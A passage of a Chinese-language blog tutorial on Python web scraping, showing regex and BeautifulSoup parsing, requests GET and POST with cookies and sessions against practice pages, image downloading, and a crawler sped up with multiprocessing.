<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Page paragraph is:</span><br><span class="line">#  这是一个在 &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;&quot;&gt;莫烦Python&lt;&#x2F;a&gt;</span><br><span class="line">#  &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;tutorials&#x2F;scraping&quot;&gt;爬虫教程&lt;&#x2F;a&gt; 中的简单测试.</span><br></pre></td></tr></table></figure>
<p>如果直接print(res)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;\n\t\t这是一个在 &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;&quot;&gt;莫烦Python&lt;&#x2F;a&gt;\n\t\t&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;tutorials&#x2F;data-manipulation&#x2F;scraping&#x2F;&quot;&gt;爬虫教程&lt;&#x2F;a&gt; 中的简单测试.\n\t&#39;]</span><br></pre></td></tr></table></figure>
<p>猜测使直接打印list时，不进行转义<br>找到所有链接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = re.findall(<span class="string">r'href="(.*?)"'</span>, html)</span><br><span class="line">print(<span class="string">"\nAll links: "</span>, res)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;static&#x2F;img&#x2F;description&#x2F;tab_icon.png&#39;, &#39;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;&#39;, &#39;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;tutorials&#x2F;data-manipulation&#x2F;scraping&#x2F;&#39;]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>BeautifulSoup </p>
<p>英文官网：<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/" target="_blank" rel="noopener">https://www.crummy.com/software/BeautifulSoup/bs4/doc/</a></p>
<p>中文官网：<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" target="_blank" rel="noopener">https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/</a></p>
</blockquote>
<h1 id="BeautifulSoup解析网页"><a href="#BeautifulSoup解析网页" class="headerlink" title="BeautifulSoup解析网页"></a>BeautifulSoup解析网页</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure>

<h3 id="简单使用方法"><a href="#简单使用方法" class="headerlink" title="简单使用方法"></a>简单使用方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line"><span class="comment">## if has Chinese, apply decode()</span></span><br><span class="line">html = urlopen(<span class="string">"https://morvanzhou.github.io/static/scraping/basic-structure.html"</span>).read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure>

<p>打印出网页html</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 以lxml形式解析网页</span></span><br><span class="line">soup = BeautifulSoup(html, features=<span class="string">'lxml'</span>)</span><br><span class="line"><span class="comment">## 选择tag h1</span></span><br><span class="line">print(soup.h1)</span><br><span class="line"><span class="comment">## 选择tag p</span></span><br><span class="line">print(soup.p)</span><br><span class="line"><span class="comment">## 返回所有的链接</span></span><br><span class="line">all_href=soup.find_all(<span class="string">'a'</span>)</span><br><span class="line"><span class="comment">## 生成一个列表</span></span><br><span class="line">all_href = [l[<span class="string">'href'</span>] <span class="keyword">for</span> l <span class="keyword">in</span> all_href]</span><br><span class="line">print(<span class="string">'\n'</span>, all_href)</span><br></pre></td></tr></table></figure>

<p>打印出来一个list</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;&#39;, &#39;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;tutorials&#x2F;data-manipulation&#x2F;scraping&#x2F;&#39;]</span><br></pre></td></tr></table></figure>
<h2 id="解析CSS"><a href="#解析CSS" class="headerlink" title="解析CSS"></a>解析CSS</h2><h3 id="CSS的Class"><a href="#CSS的Class" class="headerlink" title="CSS的Class"></a>CSS的Class</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"cn"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>爬虫练习 列表 class | 莫烦 Python<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">	.jan &#123; -- class的信息</span><br><span class="line">		background-color: yellow;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">	<span class="selector-class">.feb</span> &#123;</span></span><br><span class="line">		font-size: 25px;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">	<span class="selector-class">.month</span> &#123;</span></span><br><span class="line">		color: red;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>列表 爬虫练习<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个在 <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://morvanzhou.github.io/"</span> &gt;</span>莫烦 Python<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 的 <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://morvanzhou.github.io/tutorials/data-manipulation/scraping/"</span> &gt;</span>爬虫教程<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	里无敌简单的网页, 所有的 code 让你一目了然, 清晰无比.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"month"</span>&gt;</span>一月<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"jan"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>一月一号<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>一月二号<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>一月三号<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"feb month"</span>&gt;</span>二月<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"month"</span>&gt;</span>三月<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"month"</span>&gt;</span>四月<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"month"</span>&gt;</span>五月<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line"><span class="comment">## if has Chinese, apply decode()</span></span><br><span class="line">html = urlopen(<span class="string">"https://morvanzhou.github.io/static/scraping/list.html"</span>).read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">soup = BeautifulSoup(html, features=<span class="string">'lxml'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## use class to narrow search</span></span><br><span class="line"><span class="comment">## 标签li中，class为中包含month的</span></span><br><span class="line">month = soup.find_all(<span class="string">'li'</span>, &#123;<span class="string">"class"</span>: <span class="string">"month"</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> month:</span><br><span class="line">    <span class="comment">## m为html形式</span></span><br><span class="line">    <span class="comment">## m.get_text()为网页显示的文字</span></span><br><span class="line">    print(m.get_text())</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一月</span><br><span class="line">二月</span><br><span class="line">三月</span><br><span class="line">四月</span><br><span class="line">五月</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 嵌套查找</span></span><br><span class="line">jan = soup.find(<span class="string">'ul'</span>, &#123;<span class="string">"class"</span>: <span class="string">'jan'</span>&#125;)</span><br><span class="line">d_jan = jan.find_all(<span class="string">'li'</span>)              <span class="comment">## use jan as a parent</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> d_jan:</span><br><span class="line">    print(d.get_text())</span><br></pre></td></tr></table></figure>



<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><blockquote>
<p>正则表达式教程：<a href="https://morvanzhou.github.io/tutorials/python-basic/basic/13-10-regular-expression/" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/python-basic/basic/13-10-regular-expression/</a></p>
</blockquote>
<p>找到所有图片形式的链接</p>
<p>如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;td&gt;</span><br><span class="line">    &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;static&#x2F;img&#x2F;course_cover&#x2F;tf.jpg&quot;&gt;</span><br><span class="line">&lt;&#x2F;td&gt;</span><br></pre></td></tr></table></figure>

<p>挑选出jpg图片</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment">## if has Chinese, apply decode()</span></span><br><span class="line">html = urlopen(<span class="string">"https://morvanzhou.github.io/static/scraping/table.html"</span>).read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">soup = BeautifulSoup(html, features=<span class="string">'lxml'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## img标签中，src内容符合.jpg的内容</span></span><br><span class="line">img_links = soup.find_all(<span class="string">"img"</span>, &#123;<span class="string">"src"</span>: re.compile(<span class="string">'.*?\.jpg'</span>)&#125;)</span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> img_links:</span><br><span class="line">    print(link[<span class="string">'src'</span>])</span><br><span class="line">    </span><br><span class="line"><span class="comment">## 找到开头为https://morvan的链接</span></span><br><span class="line">course_links = soup.find_all(<span class="string">'a'</span>, &#123;<span class="string">'href'</span>: re.compile(<span class="string">'https://morvan.*'</span>)&#125;)</span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> course_links:</span><br><span class="line">    print(link[<span class="string">'href'</span>])</span><br></pre></td></tr></table></figure>



<h2 id="爬百度百科"><a href="#爬百度百科" class="headerlink" title="爬百度百科"></a>爬百度百科</h2><p>爬这个网页：<a href="https://baike.baidu.com/item/网络爬虫/5162711" target="_blank" rel="noopener">https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/5162711</a></p>
<p>从这个网页为起点，爬取并进入网页链接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 百度百科</span></span><br><span class="line">base_url = <span class="string">"https://baike.baidu.com"</span></span><br><span class="line"><span class="comment">## “网络爬虫”词条</span></span><br><span class="line">his = [<span class="string">"/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/5162711"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">## -1是指选取list中的最后一个元素</span></span><br><span class="line">url = base_url + his[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">html = urlopen(url).read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">soup = BeautifulSoup(html, features=<span class="string">'lxml'</span>)</span><br><span class="line"><span class="comment">## 找到h1</span></span><br><span class="line">print(soup.find(<span class="string">'h1'</span>).get_text(), <span class="string">'    url: '</span>, his[<span class="number">-1</span>])</span><br><span class="line"><span class="comment">## taget="_blank"是指另外打开一个网页</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## find valid urls</span></span><br><span class="line">sub_urls = soup.find_all(<span class="string">"a"</span>, &#123;<span class="string">"target"</span>: <span class="string">"_blank"</span>, <span class="string">"href"</span>: re.compile(<span class="string">"/item/(%.&#123;2&#125;)+$"</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sub_urls) != <span class="number">0</span>:</span><br><span class="line">    his.append(random.sample(sub_urls, <span class="number">1</span>)[<span class="number">0</span>][<span class="string">'href'</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">## no valid sub link found</span></span><br><span class="line">    his.pop()</span><br><span class="line">print(his)</span><br></pre></td></tr></table></figure>

<p>循环爬取多个网页</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">his = [<span class="string">"/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/5162711"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    url = base_url + his[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    html = urlopen(url).read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    soup = BeautifulSoup(html, features=<span class="string">'lxml'</span>)</span><br><span class="line">    print(i, soup.find(<span class="string">'h1'</span>).get_text(), <span class="string">'    url: '</span>, his[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find valid urls</span></span><br><span class="line">    sub_urls = soup.find_all(<span class="string">"a"</span>, &#123;<span class="string">"target"</span>: <span class="string">"_blank"</span>, <span class="string">"href"</span>: re.compile(<span class="string">"/item/(%.&#123;2&#125;)+$"</span>)&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sub_urls) != <span class="number">0</span>:</span><br><span class="line">        his.append(random.sample(sub_urls, <span class="number">1</span>)[<span class="number">0</span>][<span class="string">'href'</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">## no valid sub link found</span></span><br><span class="line">        his.pop()</span><br></pre></td></tr></table></figure>

<h1 id="更多下载-请求方式"><a href="#更多下载-请求方式" class="headerlink" title="更多下载/请求方式"></a>更多下载/请求方式</h1><h2 id="多功能的Requests"><a href="#多功能的Requests" class="headerlink" title="多功能的Requests"></a>多功能的Requests</h2><h3 id="安装requests模块"><a href="#安装requests模块" class="headerlink" title="安装requests模块"></a>安装requests模块</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure>

<h3 id="requests-get"><a href="#requests-get" class="headerlink" title="requests get"></a>requests get</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"><span class="comment"># ?wd=莫烦Python</span></span><br><span class="line">param = &#123;<span class="string">"wd"</span>: <span class="string">"莫烦Python"</span>&#125;  <span class="comment"># 搜索的信息</span></span><br><span class="line">r = requests.get(<span class="string">'http://www.baidu.com/s'</span>, params=param)</span><br><span class="line">print(r.url)</span><br><span class="line"><span class="comment"># http://www.baidu.com/s?wd=%E8%8E%AB%E7%83%A6Python</span></span><br><span class="line"><span class="comment"># 用浏览器打开</span></span><br><span class="line">webbrowser.open(r.url)</span><br></pre></td></tr></table></figure>

<h3 id="requests-post"><a href="#requests-post" class="headerlink" title="requests post"></a>requests post</h3><blockquote>
<p><a href="http://pythonscraping.com/pages/files/form.html" target="_blank" rel="noopener">http://pythonscraping.com/pages/files/form.html</a></p>
</blockquote>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/3-1-9.png"  alt="å¤åè½ç Requests"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;<span class="string">'firstname'</span>: <span class="string">'莫烦'</span>, <span class="string">'lastname'</span>: <span class="string">'周'</span>&#125;</span><br><span class="line">r = requests.post(<span class="string">'http://pythonscraping.com/files/processing.php'</span>, data=data)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hello there, 莫烦 周!</span></span><br></pre></td></tr></table></figure>

<p>提交照片</p>
<p><a href="http://pythonscraping.com/files/form2.html" target="_blank" rel="noopener">http://pythonscraping.com/files/form2.html</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = &#123;<span class="string">'uploadFile'</span>: open(<span class="string">'./image.png'</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line">r = requests.post(<span class="string">'http://pythonscraping.com/files/processing2.php'</span>, files=file)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The file image.png has been uploaded.</span></span><br></pre></td></tr></table></figure>

<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><img src="/img/loading.gif" class="lazyload" data-src="/images/爬虫入门/3-1-13.png"  alt="å¤åè½ç Requests" style="zoom:50%;">


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = &#123;<span class="string">'username'</span>: <span class="string">'Morvan'</span>, <span class="string">'password'</span>: <span class="string">'password'</span>&#125;</span><br><span class="line">r = requests.post(<span class="string">'http://pythonscraping.com/pages/cookies/welcome.php'</span>, data=payload)</span><br><span class="line">print(r.cookies.get_dict())</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;'username': 'Morvan', 'loggedin': '1'&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://pythonscraping.com/pages/cookies/profile.php'</span>, cookies=r.cookies)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hey Morvan! Looks like you're still logged into the site!</span></span><br></pre></td></tr></table></figure>

<h3 id="使用session登录"><a href="#使用session登录" class="headerlink" title="使用session登录"></a>使用session登录</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">session = requests.Session()</span><br><span class="line">payload = &#123;<span class="string">'username'</span>: <span class="string">'Morvan'</span>, <span class="string">'password'</span>: <span class="string">'password'</span>&#125;</span><br><span class="line">r = session.post(<span class="string">'http://pythonscraping.com/pages/cookies/welcome.php'</span>, data=payload)</span><br><span class="line">print(r.cookies.get_dict())</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;'username': 'Morvan', 'loggedin': '1'&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.get(<span class="string">"http://pythonscraping.com/pages/cookies/profile.php"</span>)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hey Morvan! Looks like you're still logged into the site!</span></span><br></pre></td></tr></table></figure>



<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><p>inspect 查找文件链接</p>
<p><a href="https://morvanzhou.github.io/static/img/description/learning_step_flowchart.png" target="_blank" rel="noopener">https://morvanzhou.github.io/static/img/description/learning_step_flowchart.png</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建文件夹</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.makedirs(<span class="string">'./img/'</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">IMAGE_URL = <span class="string">"https://morvanzhou.github.io/static/img/description/learning_step_flowchart.png"</span></span><br></pre></td></tr></table></figure>

<h4 id="urlretrieve"><a href="#urlretrieve" class="headerlink" title="urlretrieve"></a>urlretrieve</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlretrieve</span><br><span class="line">urlretrieve(IMAGE_URL, <span class="string">'./img/image1.png'</span>)</span><br></pre></td></tr></table></figure>

<h3 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.get(IMAGE_URL)</span><br><span class="line"><span class="comment"># 把文件写进去</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./img/image2.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(r.content)</span><br></pre></td></tr></table></figure>

<p>如果文件很大，更适合下面这个方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = requests.get(IMAGE_URL, stream=<span class="literal">True</span>)    <span class="comment"># stream loading</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./img/image3.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">32</span>):</span><br><span class="line">        f.write(chunk)</span><br></pre></td></tr></table></figure>



<h2 id="下载国家地理杂志图片"><a href="#下载国家地理杂志图片" class="headerlink" title="下载国家地理杂志图片"></a>下载国家地理杂志图片</h2><p><a href="http://www.ngchina.com.cn/animals/" target="_blank" rel="noopener">http://www.ngchina.com.cn/animals/</a></p>
<p>找到图片位置</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/爬虫入门/3-3-3.png"  alt="å°ç»ä¹ : ä¸è½½ç¾å¾" style="zoom:67%;">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">"http://www.nationalgeographic.com.cn/animals/"</span></span><br><span class="line"></span><br><span class="line">html = requests.get(URL).text</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">img_ul = soup.find_all(<span class="string">'ul'</span>, &#123;<span class="string">"class"</span>: <span class="string">"img_list"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环下载图片</span></span><br><span class="line"><span class="keyword">for</span> ul <span class="keyword">in</span> img_ul:</span><br><span class="line">    imgs = ul.find_all(<span class="string">'img'</span>)</span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> imgs:</span><br><span class="line">        url = img[<span class="string">'src'</span>]</span><br><span class="line">        r = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line">        image_name = url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'./img/%s'</span> % image_name, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">128</span>):</span><br><span class="line">                f.write(chunk)</span><br><span class="line">        print(<span class="string">'Saved %s'</span> % image_name)</span><br></pre></td></tr></table></figure>

<h1 id="爬虫加速"><a href="#爬虫加速" class="headerlink" title="爬虫加速"></a>爬虫加速</h1><h2 id="多进程加速式"><a href="#多进程加速式" class="headerlink" title="多进程加速式"></a>多进程加速式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing <span class="keyword">as</span> mp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen, urljoin</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># base_url = "http://127.0.0.1:4000/" # 内网</span></span><br><span class="line">base_url = <span class="string">'https://morvanzhou.github.io/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span><span class="params">(url)</span>:</span></span><br><span class="line">    response = urlopen(url)</span><br><span class="line">    <span class="comment"># time.sleep(0.1)             # slightly delay for downloading</span></span><br><span class="line">    <span class="keyword">return</span> response.read().decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">    urls = soup.find_all(<span class="string">'a'</span>, &#123;<span class="string">"href"</span>: re.compile(<span class="string">'^/.+?/$'</span>)&#125;)</span><br><span class="line">    title = soup.find(<span class="string">'h1'</span>).get_text().strip()</span><br><span class="line">    page_urls = set([urljoin(base_url, url[<span class="string">'href'</span>]) <span class="keyword">for</span> url <span class="keyword">in</span> urls])   <span class="comment"># 去重</span></span><br><span class="line">    url = soup.find(<span class="string">'meta'</span>, &#123;<span class="string">'property'</span>: <span class="string">"og:url"</span>&#125;)[<span class="string">'content'</span>]</span><br><span class="line">    <span class="keyword">return</span> title, page_urls, url</span><br><span class="line"></span><br><span class="line">unseen = set([base_url,]) <span class="comment"># 去重</span></span><br><span class="line">seen = set()</span><br></pre></td></tr></table></figure>

<p>普通方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># DON'T OVER CRAWL THE WEBSITE OR YOU MAY NEVER VISIT AGAIN</span></span><br><span class="line"><span class="keyword">if</span> base_url != <span class="string">"http://127.0.0.1:4000/"</span>:</span><br><span class="line">    restricted_crawl = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    restricted_crawl = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len(unseen) != <span class="number">0</span>:                 <span class="comment"># still get some url to visit</span></span><br><span class="line">    <span class="keyword">if</span> restricted_crawl <span class="keyword">and</span> len(seen) &gt;= <span class="number">20</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    htmls = [crawl(url) <span class="keyword">for</span> url <span class="keyword">in</span> unseen]</span><br><span class="line">    results = [parse(html) <span class="keyword">for</span> html <span class="keyword">in</span> htmls]</span><br><span class="line"></span><br><span class="line">    seen.update(unseen)         <span class="comment"># seen the crawled</span></span><br><span class="line">    unseen.clear()              <span class="comment"># nothing unseen</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> title, page_urls, url <span class="keyword">in</span> results:</span><br><span class="line">        unseen.update(page_urls - seen)     <span class="comment"># get new url to crawl</span></span><br></pre></td></tr></table></figure>

<p>分布式方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pool = mp.Pool(<span class="number">4</span>) <span class="comment"># 进程池</span></span><br><span class="line"><span class="keyword">while</span> len(unseen) != <span class="number">0</span>:</span><br><span class="line">    <span class="comment"># htmls = [crawl(url) for url in unseen]</span></span><br><span class="line">    <span class="comment"># ---&gt;</span></span><br><span class="line">    crawl_jobs = [pool.apply_async(crawl, args=(url,)) <span class="keyword">for</span> url <span class="keyword">in</span> unseen]</span><br><span class="line">    htmls = [j.get() <span class="keyword">for</span> j <span class="keyword">in</span> crawl_jobs]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># results = [parse(html) for html in htmls]</span></span><br><span class="line">    <span class="comment"># ---&gt;</span></span><br><span class="line">    parse_jobs = [pool.apply_async(parse, args=(html,)) <span class="keyword">for</span> html <span class="keyword">in</span> htmls]</span><br><span class="line">    results = [j.get() <span class="keyword">for</span> j <span class="keyword">in</span> parse_jobs]</span><br></pre></td></tr></table></figure>



